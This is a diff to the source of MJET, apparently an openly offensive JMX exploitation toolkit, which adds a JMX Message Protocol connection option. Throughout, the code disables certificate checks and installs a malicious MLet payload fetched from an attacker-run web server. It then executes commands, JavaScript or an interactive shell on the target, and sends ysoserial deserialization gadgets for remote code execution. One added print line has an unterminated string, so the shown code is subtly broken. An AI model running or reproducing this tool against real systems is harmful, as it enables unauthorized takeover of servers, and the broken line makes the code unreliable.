@@ -1,7 +1,4 @@
 # jmx stuff
-from javax.management.remote import JMXServiceURL
-from javax.management.remote import JMXConnector
-from javax.management.remote import JMXConnectorFactory
 from javax.management import ObjectName
 from java.lang import String
 from java.lang import Object
@@ -9,8 +6,9 @@ from jarray import array
 from java.io import IOException
 from javax.net.ssl import TrustManager, X509TrustManager
 from javax.net.ssl import SSLContext
+from java.lang import System
 # BaseHTTPServer needed to serve mlets
-from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from threading import Thread
 
 import sys
@@ -20,7 +18,6 @@ import jarray
 from jarray import array
 
 
-
 # Extra
 import argparse
 import base64
@@ -28,14 +25,15 @@ import random
 import string
 
 
-authorSignature =  'MJET - MOGWAI LABS JMX Exploitation Toolkit\n'
+authorSignature = 'MJET - MOGWAI LABS JMX Exploitation Toolkit\n'
 authorSignature += '==========================================='
+
 
 class TrustAllX509TrustManager(X509TrustManager):
     def checkClientTrusted(self, chain, auth):
         pass
 
-    def checkServerTrusted(self,chain,auth):
+    def checkServerTrusted(self, chain, auth):
         pass
 
     def getAcceptedIssuers(self):
@@ -43,6 +41,31 @@ class TrustAllX509TrustManager(X509TrustManager):
 
 
 ### AUX ###
+def jmxmp_url(args):
+    print "[+] Using JMX Message Protocol"
+    if not os.path.isfile("./jars/opendmk_jmxremote_optional_jar-1.0-b01-ea.jar"):
+        print "[-] Error: Did not find opendmk_jmxremote_optional_jar-1.0-b01-ea.jar in jars directory. Please download it from https://mvnrepository.com/artifact/org.glassfish.external/opendmk_jmxremote_optional_jar/1.0-b01-ea and move it into the jars directory"
+        print "[-] Example: java -cp jython.jar:jars/opendmk_jmxremote_optional_jar-1.0-b01-ea.jar org.python.util.jython mjet.py ..."
+        sys.exit(1)
+
+    print "[+] Using opendmk_jmxremote_optional_jar-1.0-b01-ea.jar
+        
+    from javax.management.remote import JMXServiceURL
+    jmx_url = JMXServiceURL("service:jmx:jmxmp://" +
+                            args.targetHost + ":" + args.targetPort + "/")
+    return jmx_url
+
+
+def jxmrmi_url(args):
+    print "[+] Using JMX RMI"
+
+    from javax.management.remote import JMXServiceURL
+
+    jmx_url = JMXServiceURL("service:jmx:rmi:///jndi/rmi://" +
+                            args.targetHost + ":" + args.targetPort + "/jmxrmi")
+    return jmx_url
+
+
 def connectToJMX(args):
     # Basic JMX connection, always required
     trust_managers = array([TrustAllX509TrustManager()], TrustManager)
@@ -50,15 +73,24 @@ def connectToJMX(args):
     sc = SSLContext.getInstance("SSL")
     sc.init(None, trust_managers, None)
     SSLContext.setDefault(sc)
-    jmx_url = JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args.targetHost + ":" + args.targetPort + "/jmxrmi")
+
+    if args.jmxmp:
+        jmx_url = jmxmp_url(args)
+    else:
+        jmx_url = jxmrmi_url(args)
+
+    # import after url in order to import the correct protocol implementation
+    from javax.management.remote import JMXConnector
+    from javax.management.remote import JMXConnectorFactory
 
     print "[+] Connecting to: " + str(jmx_url)
     try:
         # for passing credentials for password
         if args.jmxpassword and args.jmxrole:
-            print ("[+] Using credentials: " + str(args.jmxrole) + " / " + str(args.jmxpassword))
-            credentials = array([args.jmxrole,args.jmxpassword],String)
-            environment = {JMXConnector.CREDENTIALS:credentials}
+            print("[+] Using credentials: " + str(args.jmxrole) +
+                  " / " + str(args.jmxpassword))
+            credentials = array([args.jmxrole, args.jmxpassword], String)
+            environment = {JMXConnector.CREDENTIALS: credentials}
             jmx_connector = JMXConnectorFactory.connect(jmx_url, environment)
         else:
             jmx_connector = JMXConnectorFactory.connect(jmx_url)
@@ -68,14 +100,16 @@ def connectToJMX(args):
         return bean_server
     except:
         print "[-] Error: Can't connect to remote service"
-        
+
         if "Authentication failed! Invalid username or password" in str(sys.exc_info()[1]):
-           print "[-] Authentication failed! Invalid username or password"
+            print "[-] Authentication failed! Invalid username or password"
 
         sys.exit(-1)
 ##########
 
 ### WEBSERVER MODE ###
+
+
 def webserverMode(args):
     startWebserver(args)
     raw_input("[+] Press Enter to stop the service\n")
@@ -84,29 +118,31 @@ def webserverMode(args):
 
 ### INSTALL MODE ###
 
+
 def installMode(args):
     startWebserver(args)
     bean_server = connectToJMX(args)
     installMBean(args, bean_server)
     print "[+] Done"
 
+
 def installMBean(args, bean_server):
     # Installation, load javax.management.loading.MLet to install additional MBeans
     # If loading fails, the Mlet is already loaded...
     try:
-        mlet_bean = bean_server.createMBean("javax.management.loading.MLet", None)
+        mlet_bean = bean_server.createMBean(
+            "javax.management.loading.MLet", None)
     except:
         # MLet Bean can't be created because it already exists
-        mlet_bean = bean_server.getObjectInstance(ObjectName("DefaultDomain:type=MLet"))
+        mlet_bean = bean_server.getObjectInstance(
+            ObjectName("DefaultDomain:type=MLet"))
 
     print "[+] Loaded " + str(mlet_bean.getClassName())
-
 
     # Install payload Mlet via getMbeansFromURL
     # pass the URL of the web server
     print "[+] Loading malicious MBean from " + args.payload_url
-    print "[+] Invoking: "+ mlet_bean.getClassName() + ".getMBeansFromURL"
-
+    print "[+] Invoking: " + mlet_bean.getClassName() + ".getMBeansFromURL"
 
     inv_array1 = jarray.zeros(1, Object)
     inv_array1[0] = args.payload_url
@@ -114,7 +150,8 @@ def installMBean(args, bean_server):
     inv_array2 = jarray.zeros(1, String)
     inv_array2[0] = String.canonicalName
 
-    resource = bean_server.invoke(mlet_bean.getObjectName(), "getMBeansFromURL", inv_array1, inv_array2)
+    resource = bean_server.invoke(
+        mlet_bean.getObjectName(), "getMBeansFromURL", inv_array1, inv_array2)
 
     # Check if the Mlet was loaded successfully
 
@@ -126,10 +163,10 @@ def installMBean(args, bean_server):
 
             # Change the password from "I+n33d+a+glass+0f+watta" to the new value
             print "[+] Changing default password..."
-            changePassword("I+n33d+a+glass+0f+watta", args.password, bean_server)
+            changePassword("I+n33d+a+glass+0f+watta",
+                           args.password, bean_server)
         else:
             print res
-
 
 
 def startWebserver(args):
@@ -138,7 +175,7 @@ def startWebserver(args):
     print "[+] Starting webserver at port " + str(args.payload_port)
     mletHandler = MakeHandlerClass(args.payload_url)
     mlet_webserver = HTTPServer(('', int(args.payload_port)), mletHandler)
-    webserver_thread = Thread(target = mlet_webserver.serve_forever)
+    webserver_thread = Thread(target=mlet_webserver.serve_forever)
     webserver_thread.daemon = True
     try:
         webserver_thread.start()
@@ -146,22 +183,25 @@ def startWebserver(args):
         mlet_webserver.shutdown()
         sys.exit(0)
 
+
 def MakeHandlerClass(base_url):
-    #This class will handles any incoming request from
-    #the JMX service
+    # This class will handles any incoming request from
+    # the JMX service
     # Needed during installation of the JAR
     class CustomHandler(BaseHTTPRequestHandler):
 
-
         def __init__(self, *args, **kwargs):
-             self._base_url = base_url
-             self.jar_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(8)) + '.jar'
-             BaseHTTPRequestHandler.__init__(self, *args, **kwargs)
+            self._base_url = base_url
+            self.jar_name = ''.join(random.choice(
+                string.ascii_lowercase) for _ in range(8)) + '.jar'
+            BaseHTTPRequestHandler.__init__(self, *args, **kwargs)
 
-        #Handler for the GET requests
+        # Handler for the GET requests
         def do_GET(self):
-            if self.path=="/":
-                mlet_code = '<html><mlet code="de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload" archive="' + self.jar_name + '" name="MogwaiLabs:name=payload,id=1" codebase="' + self._base_url + '"></mlet></html>'
+            if self.path == "/":
+                mlet_code = '<html><mlet code="de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload" archive="' + \
+                    self.jar_name + '" name="MogwaiLabs:name=payload,id=1" codebase="' + \
+                    self._base_url + '"></mlet></html>'
 
                 self.send_response(200)
                 self.send_header('Pragma', 'no-cache')
@@ -193,6 +233,7 @@ def uninstallMode(args):
     uninstallMBeans(bean_server)
     print "[+] Done"
 
+
 def uninstallMBeans(bean_server):
     try:
         bean_server.unregisterMBean(ObjectName("MogwaiLabs:name=payload,id=1"))
@@ -211,10 +252,12 @@ def changePasswordMode(args):
     changePassword(args.password, args.newpass, bean_server)
     print "[+] Done"
 
+
 def changePassword(password, newpass, bean_server):
     # Payload execution
     # Load the Payload Met and invoke a method on it
-    mlet_bean = bean_server.getObjectInstance(ObjectName("MogwaiLabs:name=payload,id=1"))
+    mlet_bean = bean_server.getObjectInstance(
+        ObjectName("MogwaiLabs:name=payload,id=1"))
     print "[+] Loaded " + str(mlet_bean.getClassName())
 
     inv_array1 = jarray.zeros(2, Object)
@@ -225,7 +268,8 @@ def changePassword(password, newpass, bean_server):
     inv_array2[0] = String.canonicalName
     inv_array2[1] = String.canonicalName
 
-    resource = bean_server.invoke(mlet_bean.getObjectName(), "changePassword", inv_array1, inv_array2)
+    resource = bean_server.invoke(
+        mlet_bean.getObjectName(), "changePassword", inv_array1, inv_array2)
 
     if str(resource) == "True":
         print "[+] Successfully changed password"
@@ -244,10 +288,12 @@ def commandMode(args):
     executeCommand(args.password, args.cmd, bean_server)
     print "[+] Done"
 
+
 def executeCommand(password, cmd, bean_server):
     # Payload execution
     # Load the Payload MLet and invoke a method on it
-    mlet_bean = bean_server.getObjectInstance(ObjectName("MogwaiLabs:name=payload,id=1"))
+    mlet_bean = bean_server.getObjectInstance(
+        ObjectName("MogwaiLabs:name=payload,id=1"))
     print "[+] Loaded " + str(mlet_bean.getClassName())
 
     print "[+] Executing command: " + cmd
@@ -255,12 +301,12 @@ def executeCommand(password, cmd, bean_server):
     inv_array1[0] = password
     inv_array1[1] = cmd
 
-
     inv_array2 = jarray.zeros(2, String)
     inv_array2[0] = String.canonicalName
     inv_array2[1] = String.canonicalName
 
-    resource = bean_server.invoke(mlet_bean.getObjectName(), "runCMD", inv_array1, inv_array2)
+    resource = bean_server.invoke(
+        mlet_bean.getObjectName(), "runCMD", inv_array1, inv_array2)
 
     print resource
 
@@ -271,19 +317,22 @@ def executeCommand(password, cmd, bean_server):
 
 ### JAVASCRIPT MODE ###
 
+
 def scriptMode(args):
     bean_server = connectToJMX(args)
 
     with open(args.filename, 'r') as myfile:
-        script=myfile.read()
+        script = myfile.read()
 
     executeJS(args.password, script, bean_server)
     print "[+] Done"
 
+
 def executeJS(password, js, bean_server):
     # Payload execution
     # Load the Payload MLet and invoke a method on it
-    mlet_bean = bean_server.getObjectInstance(ObjectName("MogwaiLabs:name=payload,id=1"))
+    mlet_bean = bean_server.getObjectInstance(
+        ObjectName("MogwaiLabs:name=payload,id=1"))
     print "[+] Loaded " + str(mlet_bean.getClassName())
 
     print "[+] Executing script"
@@ -295,7 +344,8 @@ def executeJS(password, js, bean_server):
     inv_array2[0] = String.canonicalName
     inv_array2[1] = String.canonicalName
 
-    resource = bean_server.invoke(mlet_bean.getObjectName(), "runJS", inv_array1, inv_array2)
+    resource = bean_server.invoke(
+        mlet_bean.getObjectName(), "runJS", inv_array1, inv_array2)
 
     if resource is not None:
         print resource
@@ -313,6 +363,7 @@ def shellMode(args):
     startShell(args.password, bean_server)
     print "[+] Done"
 
+
 def startShell(password, bean_server):
     print "[+] Use command 'exit_shell' to exit the shell"
     in_command_loop = True
@@ -327,27 +378,28 @@ def startShell(password, bean_server):
 
 ### DESERIALIZATION MODE ###
 
+
 def deserializationMode(args):
 
-    if not os.path.isfile('./ysoserial.jar'):
-        print "[-] Error: Did not find ysoserial.jar in this folder. Please download it from https://github.com/frohoff/ysoserial"
+    if not os.path.isfile('./jars/ysoserial.jar'):
+        print "[-] Error: Did not find ysoserial.jar in jars directory. Please download it from https://github.com/frohoff/ysoserial and move it in the jars directory"
         sys.exit(1)
 
-    sys.path.append("./ysoserial.jar")
+    sys.path.append("./jars/ysoserial.jar")
     print "[+] Added ysoserial API capacities"
-    
+
     from ysoserial.payloads.ObjectPayload import Utils
-    
+
     # Connect to the JMX server
     bean_server = connectToJMX(args)
-
 
     # Generate deserialization object with ysoserial.jar
     payload_object = Utils.makePayloadObject(args.gadget, args.cmd)
 
     # Command execution
     # Load default MLet java.util.logging and invoke method getLoggerLevel on it
-    mlet_bean = bean_server.getObjectInstance(ObjectName("java.util.logging:type=Logging"))
+    mlet_bean = bean_server.getObjectInstance(
+        ObjectName("java.util.logging:type=Logging"))
     print "[+] Loaded " + str(mlet_bean.getClassName())
 
     print "[+] Passing ysoserial object as parameter to getLoggerLevel(String loglevel)"
@@ -358,16 +410,17 @@ def deserializationMode(args):
     inv_array2[0] = String.canonicalName
 
     try:
-       resource = bean_server.invoke(mlet_bean.getObjectName(), "getLoggerLevel", inv_array1, inv_array2)
+        resource = bean_server.invoke(
+            mlet_bean.getObjectName(), "getLoggerLevel", inv_array1, inv_array2)
 
     except:
         if "argument type mismatch" in str(sys.exc_info()[1]):
-           print "[+] Got an argument type mismatch exception - this is expected"
+            print "[+] Got an argument type mismatch exception - this is expected"
 
         elif "Access denied! Invalid access level" in str(sys.exc_info()[1]):
             print "[+] Got an access denied exception - this is expected"
         else:
-           print "[-] Got a " + str(sys.exc_info()[1]) + "exception, exploitation failed"
+            print "[-] Got a " + str(sys.exc_info()[1]) + "exception, exploitation failed"
 
     sys.stdout.write("\n")
     sys.stdout.flush()
@@ -378,79 +431,119 @@ def deserializationMode(args):
 
 ### PARSER ###
 # Map for clarity's sake
+
+
 def arg_install_mode(args):
     installMode(args)
+
+
 def arg_command_mode(args):
     commandMode(args)
+
+
 def arg_script_mode(args):
     scriptMode(args)
+
+
 def arg_shell_mode(args):
     shellMode(args)
+
+
 def arg_password_mode(args):
     changePasswordMode(args)
+
+
 def arg_uninstall_mode(args):
     uninstallMode(args)
+
+
 def arg_webserver_mode(args):
     webserverMode(args)
+
+
 def arg_deserialization_mode(args):
     deserializationMode(args)
+
 
 # print header
 print ""
 print authorSignature
 
 # Base parser
-parser = argparse.ArgumentParser(description = 'MJET allows an easy exploitation of insecure JMX services', epilog='--- MJET - MOGWAI LABS JMX Exploitation Toolkit ------------------', add_help=True)
+parser = argparse.ArgumentParser(description='MJET allows an easy exploitation of insecure JMX services',
+                                 epilog='--- MJET - MOGWAI LABS JMX Exploitation Toolkit ------------------', add_help=True)
 parser.add_argument('targetHost', help='target IP address')
 parser.add_argument('targetPort', help='target JMX service port')
 parser.add_argument('--jmxrole', help='remote JMX role')
 parser.add_argument('--jmxpassword', help='remote JMX password')
-subparsers = parser.add_subparsers(title='modes', description='valid modes', help='use ... MODE -h for help about specific modes')
+parser.add_argument('--jmxmp', action='store_true',
+                    help='Use JMX Message Protocol')
+
+subparsers = parser.add_subparsers(
+    title='modes', description='valid modes', help='use ... MODE -h for help about specific modes')
 
 # Install mode
-install_subparser = subparsers.add_parser('install', help='install the payload MBean on the target')
-install_subparser.add_argument('password', help="the password that should be set after successful installation")
-install_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
+install_subparser = subparsers.add_parser(
+    'install', help='install the payload MBean on the target')
+install_subparser.add_argument(
+    'password', help="the password that should be set after successful installation")
+install_subparser.add_argument(
+    'payload_url', help='URL to load the payload (full URL)')
 install_subparser.add_argument('payload_port', help='port to load the payload')
 install_subparser.set_defaults(func=arg_install_mode)
 
 # Uninstall mode
-uninstall_subparser = subparsers.add_parser('uninstall', help='uninstall the payload MBean from the target')
+uninstall_subparser = subparsers.add_parser(
+    'uninstall', help='uninstall the payload MBean from the target')
 uninstall_subparser.set_defaults(func=arg_uninstall_mode)
 
 # Password mode
-password_subparser = subparsers.add_parser('changepw', help='change the payload password on the target')
-password_subparser.add_argument('password', help="the password to access the installed MBean")
+password_subparser = subparsers.add_parser(
+    'changepw', help='change the payload password on the target')
+password_subparser.add_argument(
+    'password', help="the password to access the installed MBean")
 password_subparser.add_argument('newpass', help='The new password')
 password_subparser.set_defaults(func=arg_password_mode)
 
 # Command mode
-command_subparser = subparsers.add_parser('command', help='execute a command in the target')
-command_subparser.add_argument('password', help="the password to access the installed MBean")
+command_subparser = subparsers.add_parser(
+    'command', help='execute a command in the target')
+command_subparser.add_argument(
+    'password', help="the password to access the installed MBean")
 command_subparser.add_argument('cmd', help='command to be executed')
 command_subparser.set_defaults(func=arg_command_mode)
 
 # Javascript mode
-script_subparser = subparsers.add_parser('javascript', help='execute JavaScript code from a file in the target')
-script_subparser.add_argument('password', help="the password to access the installed MBean")
-script_subparser.add_argument('filename', help='file with the JavaScript code to be executed')
+script_subparser = subparsers.add_parser(
+    'javascript', help='execute JavaScript code from a file in the target')
+script_subparser.add_argument(
+    'password', help="the password to access the installed MBean")
+script_subparser.add_argument(
+    'filename', help='file with the JavaScript code to be executed')
 script_subparser.set_defaults(func=arg_script_mode)
 
 # Shell mode
-shell_subparser = subparsers.add_parser('shell', help='open a simple command shell in the target')
-shell_subparser.add_argument('password', help="the required password to access the installed MBean")
+shell_subparser = subparsers.add_parser(
+    'shell', help='open a simple command shell in the target')
+shell_subparser.add_argument(
+    'password', help="the required password to access the installed MBean")
 shell_subparser.set_defaults(func=arg_shell_mode)
 
 # Webserver mode
-webserver_subparser = subparsers.add_parser('webserver', help='just run the MLET web server')
-webserver_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
-webserver_subparser.add_argument('payload_port', help='port to load the system')
+webserver_subparser = subparsers.add_parser(
+    'webserver', help='just run the MLET web server')
+webserver_subparser.add_argument(
+    'payload_url', help='URL to load the payload (full URL)')
+webserver_subparser.add_argument(
+    'payload_port', help='port to load the system')
 webserver_subparser.set_defaults(func=arg_webserver_mode)
 
 
 # Deserialization mode
-deserialize_subparser = subparsers.add_parser('deserialize', help='send a ysoserial payload to the target')
-deserialize_subparser.add_argument('gadget', help='gadget as provided by ysoserial, e.g., CommonsCollections6')
+deserialize_subparser = subparsers.add_parser(
+    'deserialize', help='send a ysoserial payload to the target')
+deserialize_subparser.add_argument(
+    'gadget', help='gadget as provided by ysoserial, e.g., CommonsCollections6')
 deserialize_subparser.add_argument('cmd', help='command to be executed')
 deserialize_subparser.set_defaults(func=arg_deserialization_mode)
 
